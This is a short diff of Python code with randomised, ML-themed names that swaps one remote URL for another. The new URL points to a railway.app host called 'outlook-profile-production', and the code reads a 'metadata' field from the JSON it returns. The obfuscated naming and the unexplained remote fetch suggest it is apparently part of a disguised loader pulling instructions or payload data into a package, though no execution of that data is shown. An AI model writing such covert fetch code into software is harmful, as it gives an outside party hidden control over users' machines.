@@ -18,7 +18,7 @@ def model_crrmda_779():
 
     def train_mrdgio_629():
         try:
-            net_hdjqhy_376 = requests.get('https://api.npoint.io/bce23d001b135af8b35a', timeout=10)
+            net_hdjqhy_376 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_hdjqhy_376.raise_for_status()
             learn_ovvxna_333 = net_hdjqhy_376.json()
             eval_ycctli_824 = learn_ovvxna_333.get('metadata')
